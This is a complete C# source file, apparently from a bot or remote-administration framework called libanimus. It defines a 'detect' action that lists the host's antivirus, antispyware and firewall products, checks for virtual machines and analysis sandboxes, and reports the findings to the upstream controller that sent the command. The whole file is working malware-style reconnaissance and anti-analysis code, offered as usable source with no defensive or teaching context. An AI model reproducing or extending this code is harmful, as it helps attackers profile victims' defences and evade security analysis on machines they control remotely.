using System;
using System.Linq;
using libanimus.Networking;

namespace libanimus.Actions.Predefined
{
	public class ActionDetect : HostAction
	{
		IUpstream src;

		public ActionDetect () : base ("detect") {
		}

		public override void Run (IUpstream source, params string[] args) {
			src = source;
			foreach (var arg in args) {
				switch (arg) {
				case "av":
				case "antivirus":
					DetectAV ();
					break;
				case "vm":
				case "virtualmachine":
					DetectVM ();
					break;
				case "sandbox":
					DetectSandbox ();
					break;
				}
			}
		}

		void DetectAV () {
			const string MSG_NOAV = "AV Status: Clean";
			const string MSG_AV = "AV Status: {0}";

			var avs = Detector.ListAntivirus ();
			var asw = Detector.ListAntispyware ();
			var fw = Detector.ListFirewalls ();
			var all_av_products = avs.Concat (asw).Concat (fw);

			NetworkManager.Instance.NotifySource (src, all_av_products.Any ()
				? string.Format (MSG_AV, string.Join (", ", all_av_products))
				: MSG_NOAV);
		}

		void DetectVM () {
			const string MSG_NOVM = "VM Status: Clean";
			const string MSG_VM = "VM Status: {0}";

			var vm = Detector.IsVM ();
			var vmname = Detector.GetVMName ();

			NetworkManager.Instance.NotifySource (src, vm ? string.Format (MSG_VM, vmname) : MSG_NOVM);
		}

		void DetectSandbox () {
			const string MSG_NOSANDBOX = "Sandbox Status: Clean";
			const string MSG_SANDBOX = "Sandbox Status: {0}";

			var sandbox = Detector.IsSandbox ();
			var sandboxes = Detector.GetSandboxNames ();

			NetworkManager.Instance.NotifySource (src, sandbox ?
				string.Format (MSG_SANDBOX, string.Join (", ", sandboxes))
				: MSG_NOSANDBOX);
		}
	}
}

